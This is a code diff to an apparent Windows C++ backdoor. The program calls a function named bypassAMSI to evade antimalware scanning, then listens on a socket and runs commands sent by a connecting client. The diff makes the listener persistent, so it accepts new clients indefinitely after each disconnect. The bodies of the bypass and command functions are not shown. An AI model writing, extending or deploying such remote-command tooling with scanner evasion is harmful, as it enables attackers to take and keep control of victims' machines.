@@ -3,7 +3,6 @@
 #include <windows.h>
 #include <cstdint> // For AMSI Bypass
 
-#define DEFAULT_CLIENT_IP "127.0.0.1"
 #define DEFAULT_SERVER_IP "127.0.0.1"
 #define DEFAULT_PORT 1024
 #define BUFFER_SIZE 15000
@@ -31,7 +30,7 @@ void bypassAMSI() {
     }
 }
 
-SocketInfo createServerSocket() {
+SocketInfo createServerSocket(int port) {
     WSADATA winSockData; // Initializes Winsock
     if (WSAStartup(MAKEWORD(2, 2), &winSockData) != 0) {
         std::cerr << "WSAStartup failed!" << std::endl;
@@ -50,10 +49,7 @@ SocketInfo createServerSocket() {
     serverAddress.sin_family = AF_INET; // IPv4
 
     std::cout << "Server socket created!" << std::endl;
-    return {serverSocket, serverAddress};
-}
 
-SOCKET acceptClientConnection(SOCKET serverSocket, sockaddr_in& serverAddress, int port) {
     serverAddress.sin_port = htons(static_cast<u_short>(port)); // Set Port
 
     if (bind(serverSocket, (sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) { // Binds Socket to Address
@@ -65,6 +61,10 @@ SOCKET acceptClientConnection(SOCKET serverSocket, sockaddr_in& serverAddress, i
 
     std::cout << "Server socket bound successfully!" << std::endl;
 
+    return {serverSocket, serverAddress};
+}
+
+SOCKET acceptClientConnection(SOCKET serverSocket) {
     if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) { // Listens for Connections
         std::cerr << "Socket listening failed: " << WSAGetLastError() << std::endl;
         closesocket(serverSocket); // Closes Socket
@@ -179,20 +179,31 @@ int main(int argc, char* argv[]) {
     bypassAMSI();
 
     // Create and bind server socket
-    SocketInfo socketInfo = createServerSocket();
-    // Start listening for clients and accept connections
-    SOCKET clientSocket = acceptClientConnection(socketInfo.serverSocket, socketInfo.serverAddress, port);
-    
-    // Command Execution Loop
-    bool continueRunning = true;
-    while (clientSocket != INVALID_SOCKET && continueRunning) {
-        continueRunning = executeCommand(clientSocket);
+    SocketInfo socketInfo = createServerSocket(port);
+
+    // Repeats indefinitely
+    while(true) {
+        // Start listening for clients and accept connections
+        SOCKET clientSocket = acceptClientConnection(socketInfo.serverSocket);
+        if (clientSocket == INVALID_SOCKET) {
+            std::cerr << "Failed to accept new connection." << std::endl;
+            continue;  // Keep listening for new connections
+        }
+
+        // Command Execution Loop
+        bool continueRunning = true;
+        while (continueRunning) {
+            continueRunning = executeCommand(clientSocket);
+        }
+
+        // Close client socket after disconnection
+        closesocket(clientSocket);
+        std::cout << "Client Disconnected, waiting for new connection..." << std::endl;
     }
 
-    // Close client socket after communication
-    closesocket(clientSocket);
+    closesocket(socketInfo.serverSocket);
     WSACleanup();
-    std::cout << "Closing Socket Connection" << std::endl;
+    std::cout << "Server Shutting Down" << std::endl;
 
     return 0;
 }
